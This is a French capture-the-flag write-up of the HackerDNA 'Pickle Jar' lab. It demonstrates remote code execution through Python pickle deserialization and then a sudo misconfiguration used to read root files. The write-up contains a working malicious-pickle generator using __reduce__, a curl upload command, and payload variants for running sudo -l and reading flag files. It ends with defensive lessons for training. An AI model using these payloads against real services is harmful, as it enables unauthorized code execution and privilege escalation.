# Compte rendu : Pickle Jar

Plateforme : HackerDNA
Auteur : SRH
Catégorie : Sécurité Web & API ([https://hackerdna.com/fr/labs/pickle-jar](https://hackerdna.com/fr/labs/pickle-jar))
Difficulté : Moyenne
Tags : Python, Pickle, Désérialisation, RCE, Escalade de privilèges, Sudo, Linux
XP : +400 XP

## Scénario
DataVault Inc. permet aux utilisateurs de restaurer des configurations de sauvegarde en téléchargeant des fichiers .pkl. Le service désérialise aveuglément tout ce que vous envoyez. L'objectif est de créer un pickle malveillant pour obtenir une exécution de code à distance (RCE), puis d'escalader vers root via une règle sudo mal configurée.

Prérequis : scripting Python de base, fundamentals des applications web, ligne de commande Linux, compréhension des concepts de sérialisation.

## Chaîne d'Attaque
[Reconnaissance] → [Création du pickle malveillant] → [Upload et RCE] → [Flag utilisateur] → [Énumération sudo] → [Escalade via backup-util] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le portail expose une interface de restauration de backups acceptant des fichiers .pkl. Le module Python pickle est intrinsèquement dangereux avec des données non fiables : la méthode __reduce__ permet d'exécuter du code arbitraire lors de la désérialisation.

## Étape 2 — Création du pickle malveillant
On crée une classe Python dont la méthode __reduce__ retourne un tuple contenant une fonction callable (comme subprocess.check_output) et ses arguments. Lors de la désérialisation, la commande est exécutée sur le serveur.

import pickle
import subprocess

class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (['sh', '-c', 'id'],))

with open("exploit.pkl", "wb") as f:
    pickle.dump(RCE(), f)

## Étape 3 — Upload et confirmation du RCE
On uploade le fichier sur l'endpoint de restauration. La réponse contient la sortie de la commande exécutée, confirmant l'utilisateur du service (par exemple www-data ou vault).

curl -X POST http://<IP>/upload -F "file=@exploit.pkl"

## Étape 4 — Flag utilisateur
On modifie la commande pour lire le flag utilisateur, puis on régénère et uploade le pickle.

return (subprocess.check_output, (['sh', '-c', 'cat /home/<USER>/flag-user.txt'],))

Flag User : <USER_FLAG>

## Étape 5 — Énumération sudo
On utilise le même mécanisme pour exécuter sudo -l et identifier les commandes autorisées sans mot de passe.

return (subprocess.check_output, (['sh', '-c', 'sudo -l 2>&1'],))

Résultat attendu : (root) NOPASSWD: /opt/vault/backup-util

## Étape 6 — Flag root via backup-util
Le script backup-util est un wrapper qui lit le fichier passé en argument. On l'utilise pour lire le flag root.

return (subprocess.check_output, (['sh', '-c', 'sudo /opt/vault/backup-util /root/flag-root.txt'],))

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre une chaîne complète : désérialisation non sécurisée de pickle menant à une RCE, puis escalade de privilèges via une règle sudo trop permissive. La désérialisation de données non fiables avec pickle ne doit jamais être utilisée en production.

## Leçons Apprises
1. Ne jamais désérialiser de données pickle provenant de sources non fiables.
2. Utiliser des formats sûrs comme JSON pour les échanges de données.
3. Auditer les règles sudo : un wrapper comme backup-util peut devenir un vecteur de lecture de fichiers sensibles.
4. La désérialisation non sécurisée est un chemin direct vers la compromission complète du système.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
